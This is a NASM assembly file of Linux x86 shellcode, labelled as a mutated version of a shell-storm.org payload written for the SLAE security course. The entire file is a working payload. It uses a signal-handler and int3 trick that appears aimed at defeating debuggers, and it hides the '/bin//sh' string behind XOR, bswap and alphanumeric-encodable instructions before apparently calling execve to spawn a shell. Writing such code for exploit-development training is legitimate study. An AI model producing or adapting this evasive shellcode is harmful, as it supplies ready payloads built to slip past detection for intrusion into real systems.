; Filename: poly230.nasm
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
; Desc:  Mutated version of http://shell-storm.org/shellcode/files/shellcode-230.php 
; Purpose: SLAE

global _start

section .text
_start:
	 sub ebx,ebx
         mul ebx 
         mov byte al,0x71        
         xor al, 0x41            		 
	 mov byte bl,0x5
         jmp short locker
   
      evil_lock:
         pop ecx                
         int 0x80
         int3
         inc eax
      locker:
         call evil_lock
         cdq

         ; <evil_code>  
;---------------Alha-numeric---------------------------------
         push edx		 ; 52=ASCII 'R' 
         push dword 0x5A427A7A   ; 5A427A7A=ASCII 'ZBzz'
	 pop eax		 ; 58=ASCII 'X'
	 xor eax, 0x32315555	 ; 32315555=ASCII '21UU'
	 push eax		 ; 52=ASCII 'R'
;------------------------------------------------------------

	 xor eax,0x68732f24
	 mov dword edx,0x2f62696e 
	 bswap edx
	 push edx		 
         mov ebx,esp		 
         sub edx,edx
         push edx		 
	 push ebx		  
         push esp		 
	 jmp short evil_lock

